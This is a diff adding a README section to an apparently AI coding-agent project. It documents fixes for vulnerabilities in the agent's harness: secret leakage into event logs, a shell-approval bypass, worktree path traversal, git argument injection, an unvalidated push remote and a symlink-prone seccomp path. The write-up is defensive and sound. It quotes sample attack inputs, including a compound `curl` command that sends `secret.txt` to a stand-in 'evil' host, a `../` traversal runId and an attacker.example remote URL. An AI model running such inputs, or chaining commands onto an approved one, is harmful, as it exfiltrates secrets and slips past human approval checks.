@@ -295,6 +295,94 @@ All three have tests that fail against the pre-fix code and pass after
 (verified by literally reverting the fix and re-running for the first
 one) — see `HANDOFF.md`'s "what's done" for the full breakdown.
 
+**A follow-up security-focused review, run over the project's full
+history rather than a single diff, found and fixed six real
+vulnerabilities and two additional correctness bugs** — again worth
+naming in detail, because every fix below was independently reproduced
+against a throwaway repo/fixture *before* being trusted, and one
+subagent-reported finding was investigated and rejected as a false
+positive rather than fixed blind:
+
+1. **§5.2 redaction bypass**: `AgentLoop` scrubbed secrets out of
+   `state.messages` before persisting a transcript, but emitted the raw,
+   unredacted model reply text on the `model.response` runtime event — a
+   separately persisted artifact (`agent-api` writes every event verbatim
+   to `<stateDir>/runs/<runId>/events.jsonl`). A model quoting a secret it
+   had just read (e.g. summarizing a `.env` file) would leak it into that
+   log regardless of the transcript being clean. Fixed by scrubbing
+   `response.text` before the event is emitted, the same way `tool.call`
+   args already were.
+2. **§12.2 approval-memoization bypass**: the shell tool remembers
+   non-destructive `ALLOW` decisions per *command class* for a run's
+   lifetime, so re-running the same shape of command doesn't re-prompt.
+   `commandClassOf` derived that class by taking the first two
+   whitespace-separated tokens with no check for shell metacharacters —
+   so approving `npm test` once silently pre-approved
+   `npm test && curl http://evil/x --data-binary @secret.txt`, because
+   both strings start with the same two tokens. Fixed by falling back to
+   the full trimmed command string as the class whenever it contains a
+   shell metacharacter (`; & | \` < > \n $(`), so a compound command can
+   never ride on a simple command's approval.
+3. **§13.1 worktree path traversal**: `createRunWorktree` joined the
+   caller-supplied `runId` directly into `<stateDir>/wt/<runId>` with no
+   validation. A `runId` like `../../../../tmp/pwned-worktree` — reachable
+   over the real, untrusted-facing JSON-RPC `run` method — resolves clean
+   out of the intended worktree root via ordinary `path.join` `..`
+   normalization. Fixed with a strict `runId` allow-list regex
+   (`^[A-Za-z0-9_-]+$`) plus a defense-in-depth `path.relative` containment
+   check, proven closed at the actual RPC boundary, not just at the
+   function's own call site.
+4. **Git-log argument injection → arbitrary file write**: the `git` tool's
+   `log` op built its CLI args as `` [`-${args.arg ?? "10"}`, ...] `` —
+   a caller-controlled `arg` starting with its own `-` (e.g.
+   `-output=/tmp/x`) turns the code's own leading dash into a `--output`
+   long option, letting a model-controlled argument write an arbitrary
+   file via `git log`. Fixed by only ever accepting a bare digit count and
+   passing it as `git log -n <count>`, falling back to the default for
+   anything else.
+5. **Unvalidated git remote parameter**: `remoteUrl`/`pushBranch` accepted
+   any string as a "remote name" and passed it straight to `git`, so a
+   value like `https://attacker.example/evil.git` or an `ext::` transport
+   string would be used as-is instead of a configured remote — a
+   push-destination-redirection/exfiltration risk. (A subagent initially
+   flagged this as default-on RCE via `ext::`; empirically disproved —
+   `git`'s real default for `protocol.ext.allow` is `never`, confirmed by
+   reproducing a real `ext::` push attempt in a throwaway repo and seeing
+   git itself refuse it. The unvalidated-parameter issue is still real and
+   worth closing independent of that corrected severity.) Fixed with a
+   strict remote-name allow-list (`^[A-Za-z0-9_.-]+$`), rejecting anything
+   that looks like a URL or transport string.
+6. **Predictable seccomp filter path**: `ensureSeccompFilterFile` wrote
+   the compiled BPF filter to a fixed, predictable path in the shared temp
+   directory — a co-resident local user could pre-plant a symlink there
+   ahead of the write. Fixed by writing into a freshly `mkdtemp`'d
+   (mode-0700-guaranteed) subdirectory with `O_EXCL`, so the write refuses
+   to follow any pre-existing symlink or file at the target path.
+7. **Edit-cascade ellipsis-elision, leading-`...`  bug** (correctness, not
+   security): a SEARCH block that opens with its own `...` line (eliding
+   everything before the first real anchor) was rejected unconditionally
+   — `firstMatchIdx` was only ever set on segment index `0`, but a leading
+   ellipsis makes segment `0` the empty elided segment, which never
+   reaches that assignment. Fixed by setting `firstMatchIdx` on the first
+   segment that actually matches, not the first segment by index.
+8. **Toolchain-memory `correctToolchainFact` stale-hash bug**
+   (correctness, violates §10.3's "human edits win" contract): a human
+   correction (`agent memory correct`) reused the cached record's
+   existing `manifestHash` unchanged. If that hash was already stale
+   (e.g. `package.json` had been edited since the last derive), the very
+   next `getOrDetectToolchain` call would see the mismatch, conclude the
+   whole record was untrustworthy, and silently re-derive from scratch —
+   discarding the human's correction with no warning. Fixed by always
+   stamping the *current* manifest hash when a correction is written.
+
+All eight have tests that fail against the pre-fix code and pass after;
+six of the eight (everything except the remote-name validator and the
+seccomp path fix, whose safety follows directly and unambiguously from
+their own assertions) were verified the same way as the code-review
+pass above — `git stash` the fix, confirm the new test fails, `git
+stash pop`, confirm it passes — see `HANDOFF.md`'s "what's done" for the
+full breakdown, including the rejected false positive.
+
 ## Repository layout
 
 ```
